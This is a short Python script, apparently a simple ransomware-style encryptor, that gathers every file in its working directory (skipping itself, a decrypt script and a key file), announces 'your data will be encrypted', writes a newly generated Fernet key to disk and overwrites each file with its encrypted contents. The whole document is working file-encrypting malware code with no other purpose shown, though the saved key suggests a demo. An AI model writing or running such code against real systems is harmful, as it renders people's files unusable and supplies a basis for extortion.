import os
from cryptography.fernet import Fernet

target = []
for x in os.listdir():
    if x == "encrypt.py" or x == "decrypt.py" or x == "key00":
        continue
    if os.path.isfile(x):
        target.append(x)
print("your data will be encrypted")
print(target)

key_decrypt = Fernet.generate_key()
with open("key00", "wb") as tk:
    tk.write(key_decrypt)

for x in target:
    with open(x, "rb") as file:
        file_contents = file.read()
    encrypt = Fernet(key_decrypt).encrypt(file_contents)
    with open(x, "wb") as file:
        file.write(encrypt)
